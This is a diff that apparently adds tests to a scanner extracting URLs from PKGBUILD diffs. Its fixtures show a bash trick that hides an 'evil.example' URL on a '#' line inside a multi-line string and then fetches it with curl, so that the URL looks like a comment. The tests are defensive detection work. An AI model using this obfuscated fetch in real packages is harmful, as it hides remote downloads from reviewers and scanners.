@@ -768,3 +768,41 @@ def test_pre_post_diff_lines_keep_content_that_looks_like_a_header():
     )
     assert "--removed-flag" in _pre_diff_lines(diff)
     assert "++added-flag" in _post_diff_lines(diff)
+
+
+# --- issue #28: a '#' line inside a multi-line string is data ---
+
+def test_a_hash_line_inside_a_multiline_string_is_not_a_comment():
+    """The quote state has to cross lines; a per-line strip dropped the URL
+    on a `#` line that bash reads as part of an open string."""
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
+        " pkgname=demo\n"
+        '+_u="x\n'
+        "+#https://evil.example/p\n"
+        '+curl "${_u#*#}"\n'
+    )
+    assert "https://evil.example/p" in extract_urls_from_diff(diff).added_urls
+
+
+def test_a_real_comment_url_is_still_dropped():
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+        " pkgname=demo\n"
+        "+# https://evil.example/comment\n"
+    )
+    assert "https://evil.example/comment" not in (
+        extract_urls_from_diff(diff).added_urls
+    )
+
+
+def test_a_new_file_header_closes_an_open_quote():
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,2 @@\n"
+        '+_u="x\n'
+        "--- a/other\n+++ b/other\n@@ -1,1 +1,2 @@\n"
+        "+#https://evil.example/after\n"
+    )
+    assert "https://evil.example/after" not in (
+        extract_urls_from_diff(diff).added_urls
+    )
